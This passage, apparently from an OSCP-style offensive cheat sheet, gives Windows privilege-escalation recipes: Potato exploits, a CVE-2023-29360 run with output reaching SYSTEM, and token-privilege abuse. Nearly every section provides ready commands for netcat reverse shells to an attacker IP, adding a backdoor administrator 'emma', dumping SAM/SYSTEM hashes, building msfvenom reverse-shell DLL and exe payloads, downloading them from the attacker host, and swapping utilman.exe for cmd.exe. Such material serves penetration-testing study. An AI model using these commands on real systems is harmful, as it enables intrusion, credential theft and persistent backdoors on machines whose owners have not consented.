                <li><strong>SharpSpray</strong>: Perform password spraying attacks.</li>
              </ul>
              <pre><code class="language-powershell">PowerSharpPack -SharpSpray
</code></pre>
              <ul>
                <li><strong>Grouper2</strong>: Find vulnerabilities in AD Group Policy.</li>
              </ul>
              <pre><code class="language-powershell">PowerSharpPack -Grouper2
</code></pre>
              <ul>
                <li><strong>Watson</strong>: Enumerate missing KBs for privilege escalation.</li>
              </ul>
              <pre><code class="language-powershell">PowerSharpPack -Watson
</code></pre>
              <h5 id="71385-execution-tips">7.13.8.5 Execution Tips</h5>
              <ul>
                <li>To pass multiple parameters to a tool, enclose them in quotes:</li>
              </ul>
              <pre><code class="language-powershell">PowerSharpPack -Rubeus -Command &quot;kerberoast /outfile:roasted.txt /domain:example.com&quot;
</code></pre>
              <ul>
                <li>For loading individual binaries, use the specific script for the tool in the
                  <code>PowerSharpBinaries</code> folder of the downloaded repository.
                </li>
              </ul>
              <h3 id="714-potatoes">7.14 Potatoes</h3>
              <p><strong>SeImpersonatePrivilege</strong> or <strong>SeAssignPrimaryTokenPrivilege</strong> is required
                for most Potato exploits; use tools like <code>whoami /priv</code> or <code>winPEAS</code> to check for
                available privileges and the script in the section 7.4.2 to enable all the tokens if they are disabled.
              </p>
              <p><strong>JuicyPotato doesn&#39;t work</strong> on Windows Server 2019 and Windows 10 build 1809 onwards.
                However, <a href="https://github.com/itm4n/PrintSpoofer"
                  target="_blank"><strong>PrintSpoofer</strong></a><strong>,</strong> <a
                  href="https://github.com/antonioCoco/RoguePotato"
                  target="_blank"><strong>RoguePotato</strong></a><strong>,</strong>
                <a href="https://github.com/bugch3ck/SharpEfsPotato"
                  target="_blank"><strong>SharpEfsPotato</strong></a><strong>,</strong>
                <a href="https://github.com/BeichenDream/GodPotato"
                  target="_blank"><strong>GodPotato</strong></a><strong>,</strong> <a
                  href="https://github.com/zcgonvh/EfsPotato"
                  target="_blank"><strong>EfsPotato</strong></a><strong>,</strong> <a
                  href="https://github.com/zcgonvh/DCOMPotato" target="_blank"><strong>DCOMPotato</strong></a> can be
                used to
                <strong>leverage the same privileges and gain</strong> <code>NT AUTHORITY\SYSTEM</code> level access.
                This <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/" target="_blank">blog
                  post</a> goes
                in-depth on the <code>PrintSpoofer</code> tool, which can be used to abuse impersonation privileges on
                Windows 10 and Server 2019 hosts where JuicyPotato no longer works.
              </p>
              <h4 id="7141-dcompotato">7.14.1 DCOMPotato</h4>
              <ul>
                <li>
                  <p><strong>Targets</strong>: DCOM, Windows 7, 8, 10 / Server 2008 R2, 2012, 2016, 2019</p>
                </li>
                <li>
                  <p><strong>Description</strong>: Exploits DCOM configurations to escalate privileges.</p>
                </li>
                <li>
                  <p><strong>Normal Command</strong>:</p>
                </li>
              </ul>
              <pre><code class="language-bash">DCOMPotato.exe -c &quot;C:\Windows\System32\cmd.exe&quot;
</code></pre>
              <ul>
                <li><strong>Reverse Shell Command</strong>:</li>
              </ul>
              <pre><code class="language-bash">DCOMPotato.exe -c &quot;C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444&quot;
</code></pre>
              <ul>
                <li><strong>Add New Admin User Command</strong>:</li>
              </ul>
              <pre><code class="language-bash"># Creates the new user
DCOMPotato.exe -c &quot;C:\Windows\System32\net.exe user emma Password123 /add&quot;

# Adds it as admin
DCOMPotato.exe -c &quot;C:\Windows\System32\net.exe localgroup Administrators emma /add&quot;
</code></pre>
              <ul>
                <li><strong>GitHub Reference</strong>: <a href="https://github.com/zcgonvh/DCOMPotato"
                    target="_blank">DCOMPotato
                    GitHub</a></li>
              </ul>
              <h4 id="7142-efspotato">7.14.2 EfsPotato</h4>
              <ul>
                <li>
                  <p><strong>Targets</strong>: EFS, NTLM, Windows 10 / Server 2016, 2019</p>
                </li>
                <li>
                  <p><strong>Description</strong>: Exploits EFS in a C# implementation for privilege escalation.</p>
                </li>
                <li>
                  <p><strong>Normal Command</strong>:</p>
                </li>
              </ul>
              <pre><code class="language-bash">EfsPotato.exe &quot;C:\Windows\System32\cmd.exe&quot;
</code></pre>
              <ul>
                <li><strong>Reverse Shell Command</strong>:</li>
              </ul>
              <pre><code class="language-bash">EfsPotato.exe -c &quot;C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444&quot;
</code></pre>
              <ul>
                <li><strong>Add New Admin User Command</strong>:</li>
              </ul>
              <pre><code class="language-bash"># Creates the new user
EfsPotato.exe -c &quot;C:\Windows\System32\net.exe user emma Password123 /add&quot;

# Adds it as admin
EfsPotato.exe -c &quot;C:\Windows\System32\net.exe localgroup Administrators emma /add&quot;
</code></pre>
              <ul>
                <li><strong>GitHub Reference</strong>: <a href="https://github.com/zcgonvh/EfsPotato"
                    target="_blank">EfsPotato
                    GitHub</a></li>
              </ul>
              <h4 id="7143-godpotato">7.14.3 GodPotato</h4>
              <ul>
                <li>
                  <p><strong>Targets</strong>: DCOM, Windows 7, 8, 10 / Server 2012, 2016</p>
                </li>
                <li>
                  <p><strong>Description</strong>: Exploits insecure DCOM configurations for privilege escalation.</p>
                </li>
                <li>
                  <p><strong>Normal Command</strong>:</p>
                </li>
              </ul>
              <pre><code class="language-bash">GodPotato.exe -cmd &quot;C:\Windows\System32\cmd.exe&quot;
</code></pre>
              <ul>
                <li><strong>Reverse Shell Command</strong>:</li>
              </ul>
              <pre><code class="language-bash">GodPotato.exe -cmd &quot;C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444&quot;
</code></pre>
              <ul>
                <li><strong>Add New Admin User Command</strong>:</li>
              </ul>
              <pre><code class="language-bash"># Creates the new user
GodPotato.exe -cmd &quot;C:\Windows\System32\net.exe user emma Password123 /add&quot;

# Adds it as admin
GodPotato.exe -cmd &quot;C:\Windows\System32\net.exe localgroup Administrators emma /add&quot;
</code></pre>
              <ul>
                <li><strong>References</strong>: <a href="https://github.com/emmasolis1/oscp_tools"
                    download target="_blank">Download</a>, <a href="https://github.com/BeichenDream/GodPotato"
                    target="_blank">GitHub</a></li>
              </ul>
              <h4 id="7144-hot-potato-cve-2016-3225">7.14.4 Hot Potato (CVE-2016-3225)</h4>
              <ul>
                <li>
                  <p><strong>Targets</strong>: NTLM, SMB, Windows 7 / Server 2008 R2</p>
                </li>
                <li>
                  <p><strong>Description</strong>: Exploits NTLM relay attacks to escalate privileges.</p>
                </li>
                <li>
                  <p><strong>Normal Command</strong>:</p>
                </li>
              </ul>
              <pre><code class="language-bash">HotPotato.exe -ip -cmd &quot;C:\Windows\System32\cmd.exe&quot;
</code></pre>
              <ul>
                <li><strong>Reverse Shell Command</strong>:</li>
              </ul>
              <pre><code class="language-bash">HotPotato.exe -ip -cmd &quot;C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444&quot;
</code></pre>
              <ul>
                <li><strong>Add New Admin User Command</strong>:</li>
              </ul>
              <pre><code class="language-bash"># Creates the new user
HotPotato.exe -ip -cmd &quot;C:\Windows\System32\net.exe user emma Password123 /add&quot;

# Adds it as admin
HotPotato.exe -ip -cmd &quot;C:\Windows\System32\net.exe localgroup Administrators emma /add&quot;
</code></pre>
              <ul>
                <li><strong>References</strong>: <a href="https://github.com/excid3/HotPotato"
                    target="_blank">GitHub</a>, <a href="https://foxglovesecurity.com/2016/01/16/hot-potato/"
                    target="_blank">Usage Guide</a></li>
              </ul>
              <h4 id="7145-juicy-potato">7.14.5 Juicy Potato</h4>
              <ul>
                <li>
                  <p><strong>Targets</strong>: COM objects, NTLM, Windows Server 2012 / Server 2016</p>
                </li>
                <li>
                  <p><strong>Description</strong>: Exploits COM objects for privilege escalation using the Juicy Potato
                    exploit.</p>
                </li>
                <li>
                  <p><strong>Note</strong>: Use the <a href="http://ohpe.it/juicy-potato/CLSID/" target="_blank">correct
                      CLSID</a> based
                    on the Windows version.</p>
                </li>
                <li>
                  <p><strong>Normal Command</strong>:</p>
                </li>
              </ul>
              <pre><code class="language-bash">JuicyPotato.exe -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097} -t * -p c:\windows\system32\cmd.exe
</code></pre>
              <ul>
                <li><strong>Reverse Shell Command</strong>:</li>
              </ul>
              <pre><code class="language-bash">JuicyPotato.exe -l 1337 -c {F0001111-0000-0000-0000-0000FEEDACDC} -t * -p &quot;C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444&quot;
</code></pre>
              <ul>
                <li><strong>Add New Admin User Command</strong>:</li>
              </ul>
              <pre><code class="language-bash"># Creates the new user
JuicyPotato.exe -l 1337 -c [clsid] -t * -p &quot;C:\Windows\System32\net.exe user emma Password123 /add&quot;

# Adds it as admin
JuicyPotato.exe -l 1337 -c [clsid] -t * -p &quot;C:\Windows\System32\net.exe localgroup Administrators emma /add&quot;
</code></pre>
              <ul>
                <li><strong>References</strong>: <a href="https://github.com/emmasolis1/oscp_tools" download target="_blank">Download</a>,
                  <a href="http://ohpe.it/juicy-potato/CLSID/" target="_blank">Get the CLSID</a>, <a
                    href="https://github.com/ohpe/juicy-potato" target="_blank">GitHub</a>, <a
                    href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato#juicy-potato-abusing-the-golden-privileges"
                    target="_blank">HackTricks
                    Guide</a>
                </li>
              </ul>
              <h4 id="7146-printspoofer">7.14.6 PrintSpoofer</h4>
              <ul>
                <li>
                  <p><strong>Targets</strong>: Print Spooler Service, Windows 10 / Server 2019</p>
                </li>
                <li>
                  <p><strong>Description</strong>: Exploits vulnerabilities in the Print Spooler service for privilege
                    escalation.</p>
                </li>
                <li>
                  <p><strong>Normal Command</strong>:</p>
                </li>
              </ul>
              <pre><code class="language-bash">PrintSpoofer.exe -c whoami
</code></pre>
              <ul>
                <li><strong>Reverse Shell Command</strong>:</li>
              </ul>
              <pre><code class="language-bash">PrintSpoofer.exe -c &quot;C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444&quot;
</code></pre>
              <ul>
                <li><strong>Add New Admin User Command</strong>:</li>
              </ul>
              <pre><code class="language-bash"># Creates the new user
PrintSpoofer.exe -c &quot;C:\Windows\System32\net.exe user emma Password123 /add&quot;

# Adds it as admin
PrintSpoofer.exe -c &quot;C:\Windows\System32\net.exe localgroup Administrators emma /add&quot;
</code></pre>
              <ul>
                <li><strong>References</strong>: <a href="https://github.com/emmasolis1/oscp_tools" download target="_blank">Download</a>,
                  <a href="https://github.com/itm4n/PrintSpoofer" target="_blank">GitHub</a>
                </li>
              </ul>
              <h4 id="7147-rogue-potato">7.14.7 Rogue Potato</h4>
              <ul>
                <li>
                  <p><strong>Targets</strong>: DCOM, NTLM, Windows 10 / Server 2019</p>
                </li>
                <li>
                  <p><strong>Description</strong>: Similar to Juicy Potato, Rogue Potato exploits DCOM for privilege
                    escalation.</p>
                </li>
                <li>
                  <p><strong>Normal Command</strong>:</p>
                </li>
              </ul>
              <pre><code class="language-bash">RoguePotato.exe -r [ATTACKER_IP] -e whoami
</code></pre>
              <ul>
                <li><strong>Reverse Shell Command</strong>:</li>
              </ul>
              <pre><code class="language-bash">RoguePotato.exe -r [ATTACKER_IP] -e &quot;C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444&quot;
</code></pre>
              <ul>
                <li><strong>Add New Admin User Command</strong>:</li>
              </ul>
              <pre><code class="language-bash"># Creates the new user
RoguePotato.exe -r [ATTACKER_IP] -e &quot;C:\Windows\System32\net.exe user emma Password123 /add&quot;

# Adds it as admin
RoguePotato.exe -r [ATTACKER_IP] -e &quot;C:\Windows\System32\net.exe localgroup Administrators emma /add&quot;
</code></pre>
              <ul>
                <li><strong>References</strong>: <a href="https://github.com/emmasolis1/oscp_tools" download target="_blank">Download</a>,
                  <a href="https://github.com/antonioCoco/RoguePotato" target="_blank">GitHub</a>
                </li>
              </ul>
              <h4 id="7148-rottenpotato">7.14.8 RottenPotato</h4>
              <ul>
                <li>
                  <p><strong>Targets</strong>: DCOM, NTLM</p>
                </li>
                <li>
                  <p><strong>Description</strong>: A variation of DCOM exploitation techniques for privilege escalation.
                  </p>
                </li>
                <li>
                  <p><strong>Note</strong>: This method has largely been superseded by Juicy Potato.</p>
                </li>
                <li>
                  <p><strong>Normal Command</strong>:</p>
                </li>
              </ul>
              <pre><code class="language-bash">RottenPotato.exe
</code></pre>
              <ul>
                <li>
                  <p><strong>Reverse Shell Command</strong>: consider using Juicy Potato for a more reliable version.
                  </p>
                </li>
                <li>
                  <p><strong>Add New Admin User Command</strong>: consider using Juicy Potato for a more reliable
                    version.</p>
                </li>
                <li>
                  <p><strong>References</strong>: <a href="https://github.com/emmasolis1/oscp_tools" download target="_blank">Download</a>,
                    <a href="https://github.com/breenmachine/RottenPotatoNG" target="_blank">GitHub</a>
                  </p>
                </li>
              </ul>
              <h4 id="7149-sharpefspotato">7.14.9 SharpEfsPotato</h4>
              <ul>
                <li>
                  <p><strong>Targets</strong>: EFS, NTLM</p>
                </li>
                <li>
                  <p><strong>Description</strong>: Exploits EFS (Encrypting File System) to escalate privileges using
                    Sharp.</p>
                </li>
                <li>
                  <p><strong>Normal Command</strong>:</p>
                </li>
              </ul>
              <pre><code class="language-bash">SharpEfsPotato.exe -p &quot;C:\Windows\System32\cmd.exe&quot;

# Example
SharpEfsPotato.exe -p &quot;C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe&quot; -a &quot;whoami | Set-Content C:\temp\w.log&quot;
</code></pre>
              <ul>
                <li><strong>Reverse Shell Command</strong>:</li>
              </ul>
              <pre><code class="language-bash">SharpEfsPotato.exe -p &quot;C:\Windows\system32\cmd.exe&quot; -a &quot;/c C:\temp\nc.exe [kali_ip] [port] -e cmd.exe&quot;
or
SharpEfsPotato.exe -p &quot;C:\Windows\System32\nc.exe&quot; -a &quot;-e cmd.exe [kali_ip] [port]&quot;
</code></pre>
              <ul>
                <li><strong>Add New Admin User Command</strong>:</li>
              </ul>
              <pre><code class="language-bash"># Creates the new user
SharpEfsPotato.exe -p &quot;C:\Windows\System32\net.exe&quot; -a &quot;user emma Password123 /add&quot;

# Adds the user to the Administrators group
SharpEfsPotato.exe -p &quot;C:\Windows\System32\net.exe&quot; -a &quot;localgroup Administrators emma /add&quot;
</code></pre>
              <ul>
                <li><strong>References</strong>: <a href="https://github.com/emmasolis1/oscp_tools" download target="_blank">Download</a>, <a
                    href="https://github.com/bugch3ck/SharpEfsPotato">GitHub</a></li>
              </ul>
              <h4 id="71410-sigmapotato">7.14.10 SigmaPotato</h4>
              <ul>
                <li>
                  <p><strong>Targets</strong>: DCOM, NTLM (Windows 8, 8.1 - Windows 11 / Server 2012 - 2022)</p>
                </li>
                <li>
                  <p><strong>Description</strong>: Exploits DCOM vulnerabilities in Windows systems.</p>
                </li>
                <li>
                  <p><strong>Normal Command</strong>:</p>
                </li>
              </ul>
              <pre><code class="language-bash">SigmaPotato.exe cmd.exe /c whoami
</code></pre>
              <ul>
                <li><strong>Reverse Shell Command</strong>:</li>
              </ul>
              <pre><code class="language-bash">SigmaPotato.exe --revshell [ATTACKER_IP] 4444
</code></pre>
              <ul>
                <li><strong>Add New Admin User Command</strong>:</li>
              </ul>
              <pre><code class="language-bash"># Creates the new user
SigmaPotato.exe cmd.exe /c &quot;net user emma Password123 /add&quot;

# Adds it as admin
SigmaPotato.exe cmd.exe /c &quot;net localgroup Administrators emma /add&quot;
</code></pre>
              <ul>
                <li><strong>References</strong>: <a href="https://github.com/emmasolis1/oscp_tools"
                    download target="_blank">Download</a>,
                  <a href="https://github.com/tylerdotrar/SigmaPotato" target="_blank">GitHub</a>
                </li>
              </ul>
              <h4 id="71411-sweetpotato">7.14.11 SweetPotato</h4>
              <ul>
                <li>
                  <p><strong>Targets</strong>: Windows Services (Windows 10 / Server 2016+)</p>
                </li>
                <li>
                  <p><strong>Description</strong>: Abuses Windows Services to escalate privileges.</p>
                </li>
                <li>
                  <p><strong>Normal Command</strong>:</p>
                </li>
              </ul>
              <pre><code class="language-bash">SweetPotato.exe -a whoami
</code></pre>
              <ul>
                <li><strong>Reverse Shell Command</strong>:</li>
              </ul>
              <pre><code class="language-bash">SweetPotato.exe -a &quot;C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444&quot;
</code></pre>
              <ul>
                <li><strong>Add New Admin User Command</strong>:</li>
              </ul>
              <pre><code class="language-bash"># Creates the new user
SweetPotato.exe -a &quot;C:\Windows\System32\net.exe user emma Password123 /add&quot;

# Adds it as admin
SweetPotato.exe -a &quot;C:\Windows\System32\net.exe localgroup Administrators emma /add&quot;
</code></pre>
              <ul>
                <li><strong>References</strong>: <a href="https://github.com/emmasolis1/oscp_tools" download target="_blank">Download</a>,
                  <a href="https://github.com/CCob/SweetPotato" target="_blank">GitHub</a>
                </li>
              </ul>
              <h3 id="715-exploits">7.15 Exploits</h3>
              <p><strong>More possible exploit for different permissions can be found in <a
                    href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#tokens"
                    target="_blank">HackTricks</a>.</strong>
              </p>
              <h4 id="7151-cve-2023-29360">7.15.1 CVE-2023-29360</h4>
              <p>This is a kernel vulnerability, a fix has been provided in the patch <em><a
                    href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29360"
                    target="_blank">KB5027215</a></em>;
                impacted versions include Windows 10 (1607, 1809, 21H2, and 22H2), Windows 11 (21H2 and 22H2), and
                Windows Server (2016, 2019, and 2022). The vulnerability impacts various configurations, including x64,
                x86, and ARM64 systems. To exploit it we can use this <a href="https://github.com/emmasolis1/oscp_tools"
                    download target="_blank"><code>CVE-2023-29360.exe</code></a>,
                the GitHub can be found in <a
                  href="https://github.com/sickn3ss/exploits/tree/master/CVE-2023-29360/x64/Release"
                  target="_blank">this link</a>.</p>
              <pre><code class="language-powershell">PS C:\Users\emma\Desktop&gt; whoami
redteam\emma

PS C:\Users\emma\Desktop&gt; .\CVE-2023-29360.exe
[+] Device Description: Microsoft Streaming Service Proxy
Hardware IDs:
        &quot;SW\{96E080C7-143C-11D1-B40F-00A0C9223196}&quot;
[+] Device Instance ID: SW\{96E080C7-143C-11D1-B40F-00A0C9223196}\{3C0D501A-140B-11D1-B40F-00A0C9223196}
[+] First mapped _MDL: 25f9aa00140
[+] Second mapped _MDL: 25f9aa10040
[+] Unprivileged token reference: ffffd1072dde6061
[+] System token reference: ffffd1071de317d5
Microsoft Windows [Version 10.0.22621.1555]
(c) Microsoft Corporation. All rights reserved.

C:\Users\emma\Desktop&gt; whoami
nt authority\system
</code></pre>
              <h4 id="7152-seassignprimarytoken">7.15.2 SeAssignPrimaryToken</h4>
              <p>If we have this privilege we can abuse it in the same way as <code>SeImpersonate</code> so we can use
                the Potatoes <a href="https://github.com/emmasolis1/oscp_tools" download target="_blank"><code>JuicyPotato</code></a>
                or <a href="https://github.com/emmasolis1/oscp_tools" download target="_blank"><code>RoguePotato</code></a>:
              </p>
              <p><strong>JuicyPotato</strong></p>
              <ul>
                <li>
                  <p>Find the <a href="http://ohpe.it/juicy-potato/CLSID/" target="_blank"><strong>correct
                        CLSID</strong></a> based on
                    the Windows Version.</p>
                </li>
                <li>
                  <p><strong>Normal</strong> Command</p>
                </li>
              </ul>
              <pre><code class="language-powershell">JuicyPotato.exe -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097} -t * -p c:\windows\system32\cmd.exe
</code></pre>
              <ul>
                <li><strong>Reverse Shell</strong> Command</li>
              </ul>
              <pre><code class="language-powershell">JuicyPotato.exe -l 1337 -c {F0001111-0000-0000-0000-0000FEEDACDC} -t * -p &quot;C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444&quot;
</code></pre>
              <ul>
                <li>Add <strong>New Admin</strong> Commands</li>
              </ul>
              <pre><code class="language-powershell"># Creates the new user
JuicyPotato.exe -l 1337 -c [clsid] -t * -p &quot;C:\Windows\System32\net.exe user emma Password123 /add&quot;

# Adds it as admin
JuicyPotato.exe -l 1337 -c [clsid] -t * -p &quot;C:\Windows\System32\net.exe localgroup Administrators emma /add&quot;
</code></pre>
              <ul>
                <li><strong>References</strong>: <a href="https://github.com/emmasolis1/oscp_tools" download target="_blank">Download</a>,
                  <a href="http://ohpe.it/juicy-potato/CLSID/" target="_blank">Get the CLSID</a>, <a
                    href="https://github.com/ohpe/juicy-potato" target="_blank">GitHub</a>, <a
                    href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato#juicy-potato-abusing-the-golden-privileges"
                    target="_blank">HackTricks Guide</a>.
                </li>
              </ul>
              <p><strong>RoguePotato</strong></p>
              <ul>
                <li><strong>Normal</strong> Command</li>
              </ul>
              <pre><code class="language-powershell">RoguePotato.exe -r [kali_ip] -e whoami
</code></pre>
              <ul>
                <li><strong>Reverse Shell</strong> Command</li>
              </ul>
              <pre><code class="language-powershell">RoguePotato.exe -r [kali_ip] -e &quot;C:\Windows\System32\nc.exe -e cmd.exe [kali_ip] [port]&quot;
</code></pre>
              <ul>
                <li><strong>Add New Admin</strong> Commands</li>
              </ul>
              <pre><code class="language-powershell"># Creates the new user
RoguePotato.exe -r [kali_ip] -e &quot;C:\Windows\System32\net.exe user emma Password123 /add&quot;

# Adds it as admin
RoguePotato.exe -r [kali_ip] -e &quot;C:\Windows\System32\net.exe localgroup Administrators emma /add&quot;
</code></pre>
              <ul>
                <li><strong>References</strong>: <a href="https://github.com/emmasolis1/oscp_tools" download target="_blank">Download</a>,
                  <a href="https://github.com/antonioCoco/RoguePotato" target="_blank">GitHub</a>.
                </li>
              </ul>
              <h4 id="7153-sebackup">7.15.3 SeBackup</h4>
              <p>This is not an exploit executable itself but a technique. If we have the
                <code>SeBackupPrivilege</code>, we can access the filesystem and make copies of sensitive data:
              </p>
              <ol>
                <li><strong>Copy SAM and SYSTEM files</strong></li>
              </ol>
              <pre><code class="language-powershell">reg save hklm\sam c:\Temp\sam  
reg save hklm\system c:\Temp\system
</code></pre>
              <ol start="2">
                <li>
                  <p><strong>Download</strong> the files to Kali: refer to techniques in Section 17.</p>
                </li>
                <li>
                  <p><strong>Extract Secrets</strong></p>
                </li>
              </ol>
              <pre><code class="language-bash">impacket-secretsdump -system system -sam sam local
</code></pre>
              <h4 id="7154-sedebug">7.15.4 SeDebug</h4>
              <p>This privilege permits the <strong>debug other processes</strong>, including to read and write in the
                memore. Various strategies for memory injection, capable of evading most antivirus and host intrusion
                prevention solutions, can be employed with this privilege. To get Code Execution as Administrator we can
                use this <a href="https://github.com/emmasolis1/oscp_tools" download target="_blank">exploit
                  <code>SeDebugPrivesc.exe</code></a>.</p>
              <ol>
                <li><strong>Get a PID of a process running as SYSTEM</strong></li>
              </ol>
              <pre><code class="language-powershell">ps
</code></pre>
              <ol start="2">
                <li><strong>Run the <a href="https://github.com/emmasolis1/oscp_tools"
                    download target="_blank">exploit</a></strong></li>
              </ol>
              <pre><code class="language-powershell">.\SeDebugPrivesc.exe &lt;PID&gt; &lt;Program and Arguments&gt;
</code></pre>
              <h4 id="7155-seimpersonate">7.15.5 SeImpersonate</h4>
              <p>This is one of the most advantageous privileges. If available, we can <strong>use nearly any exploit
                  from Section 7.14</strong>. If the privilege is shown as <code>Disabled</code>, use the script from
                Section 7.4.2 to enable it. Available &quot;potato&quot; exploits include:</p>
              <ul>
                <li><a href="https://github.com/emmasolis1/oscp_tools"
                    download target="_blank">GodPotato</a></li>
                <li><a href="https://github.com/emmasolis1/oscp_tools"
                    download target="_blank">JuicyPotato</a></li>
                <li><a href="https://github.com/emmasolis1/oscp_tools"
                    download target="_blank">PrintSpoofer</a></li>
                <li><a href="https://github.com/emmasolis1/oscp_tools"
                    download target="_blank">RoguePotato</a></li>
                <li><a href="https://github.com/emmasolis1/oscp_tools"
                    download target="_blank">SigmaPotato</a></li>
                <li><a href="https://github.com/emmasolis1/oscp_tools"
                    download target="_blank">SweetPotato</a></li>
              </ul>
              <h4 id="7156-semanagevolumeabuse">7.15.6 SeManageVolumeAbuse</h4>
              <p>With this privilege, an attacker can gain full control over <code>C:\</code> by crafting and placing a
                malicious <code>.dll</code> file in <code>C:\Windows\System32\</code>, we just to use this <a
                  href="https://github.com/emmasolis1/oscp_tools"
                  download target="_blank">exploit</a>.</p>
                  <code>SeManageVolumeExploit.exe</code></a>. Then by replacing
                <code>C:\Windows\System32\wbem\tzres.dll</code> with the malicious DLL, which is triggered by running
                the <code>systeminfo</code> command, will execute the payload as Administrator.
              </p>
              <ol>
                <li><strong>Check</strong> if we have the permission:</li>
              </ol>
              <pre><code class="language-powershell">whoami /priv
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/semanage_1.png" class="img-fluid" alt="Checking for SeManageVolume privilege.">
                  <figcaption class="figure-caption text-center">Checking for <code>SeManageVolume</code> privilege.
                  </figcaption>
                </figure>
              </div>
              <ol start="2">
                <li><a href="https://github.com/emmasolis1/oscp_tools" download target="_blank">Download
                    the Executable</a>, and <strong>execute it in the victim</strong> machine:</li>
              </ol>
              <pre><code class="language-powershell">.\SeManageVolumeExploit.exe
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/semanage_2.png" class="img-fluid" alt="Executing the exploit.">
                  <figcaption class="figure-caption text-center">Executing the exploit.</figcaption>
                </figure>
              </div>
              <ol start="3">
                <li><strong>Create the Malicious DLL</strong>:</li>
              </ol>
              <pre><code class="language-bash">msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[attacker_ip] LPORT=[port] -f dll -o tzres.dll
</code></pre>
              <ol start="4">
                <li><strong>Transfer the DLL to the victim</strong> in <code>C:\Windows\System32\wbem\tzres.dll</code>:
                </li>
              </ol>
              <pre><code class="language-powershell">iwr -uri http://[kali_ip]/tzres.dll -OutFile &quot;C:\Windows\System32\wbem\tzres.dll&quot;
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/semanage_3.png" class="img-fluid" alt="Replacing C:\Windows\System32\wbem\tzres.dll.">
                  <figcaption class="figure-caption text-center">Replacing
                    <code>C:\Windows\System32\wbem\tzres.dll</code>.
                  </figcaption>
                </figure>
              </div>
              <ol start="5">
                <li><strong>Run <code>systeminfo</code> to trigger the DLL</strong>:</li>
              </ol>
              <pre><code class="language-powershell">systeminfo
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/semanage_4.png" class="img-fluid" alt="Triggering the payload for a reverse shell.">
                  <figcaption class="figure-caption text-center">Triggering the payload for a reverse shell.
                  </figcaption>
                </figure>
              </div>
              <h4 id="7157-serestore">7.15.7 SeRestore</h4>
              <p>For this privilege we have two possible options to escalate privileges; either replace
                <code>utilman.exe</code> and the connect via RDP to trigger an action that will give us an administrator
                shell, or use <a href="https://github.com/emmasolis1/oscp_tools" download target="_blank">this exploit
                  <code>SeRestoreAbuse.exe</code></a> to try to get an administrator shell:
              </p>
              <p><strong>(Option 1) Replacing <code>utilman.exe</code></strong></p>
              <ol>
                <li><strong>Rename the existing <code>utilman.exe</code></strong></li>
              </ol>
              <pre><code class="language-powershell">cd C:\Windows\system32

ren Utilman.exe Utilman.old
</code></pre>
              <ol start="2">
                <li><strong>Rename the CMD.exe</strong></li>
              </ol>
              <pre><code class="language-powershell">ren cmd.exe Utilman.exe
</code></pre>
              <ol start="3">
                <li><strong>Lock the Computer or Connect via RDP</strong></li>
              </ol>
              <pre><code class="language-powershell"># Lock the computer
Windows + L

# Connect via RDP in a way that request for credentials in the Windows screen
rdesktop [ip]
</code></pre>
              <ol start="4">
                <li><strong>Trigger the Action</strong>: this should make appear an <code>nt authority\system</code>
                  shell.</li>
              </ol>
              <pre><code class="language-powershell"># Once in the Windows Login Screen press
Windows + U
</code></pre>
              <p><strong>(Option 2) Using the <a href="https://github.com/emmasolis1/oscp_tools"
                    download target="_blank">exploit
                    <code>SerestoreAbuse.exe</code></a></strong></p>
              <ol>
                <li><strong>Bring the exploit</strong> to the victim</li>
              </ol>
              <pre><code class="language-powershell">iwr -uri http://[kali_ip]/SeRestoreAbuse.exe -O SeRestoreAbuse.exe
</code></pre>
              <ol start="2">
                <li><strong>Execute the exploit</strong></li>
              </ol>
              <pre><code class="language-powershell"># (Option 1) Netcat direct reverse shell
.\SeRestoreAbuse.exe &quot;C:\temp\nc.exe [attacker_ip] [port] -e powershell.exe&quot;

# (Option 2) Payload reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[kali_ip] LPORT=[port] -f exe -o payload.exe
.\SeRestoreAbuse.exe C:\temp\payload.exe
</code></pre>

              <h2 id="8-linux-privilege-escalation">8. <span class="emoji">üêß</span> Linux Privilege Escalation</h2>
              <h3 id="81-enumeration">8.1 Enumeration</h3>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th>Enumeration Type</th>
                    <th>Command(s)</th>
                    <th>Description</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><strong>Current user</strong></td>
                    <td><code>id</code></td>
                    <td>Displays user ID, group ID, and privileges of the current user.</td>
                  </tr>
                  <tr>
                    <td><strong>Hostname</strong></td>
                    <td><code>hostname</code></td>
                    <td>Shows the name of the system&#39;s host.</td>
                  </tr>
                  <tr>
                    <td><strong>OS versions and architecture</strong></td>
                    <td><code>cat /etc/issue</code>, <code>cat /etc/os-release</code>, <code>uname -a</code></td>
                    <td>Displays the operating system version, release info, and kernel architecture.</td>
                  </tr>
                  <tr>
                    <td><strong>Running processes</strong></td>
                    <td><code>ps aux</code></td>
                    <td>Lists all running processes with their users, CPU usage, and other details.</td>
                  </tr>
                  <tr>
                    <td><strong>Network interfaces, routes, connections, open ports</strong></td>
                    <td><code>ip a</code>, <code>ss -anp</code></td>
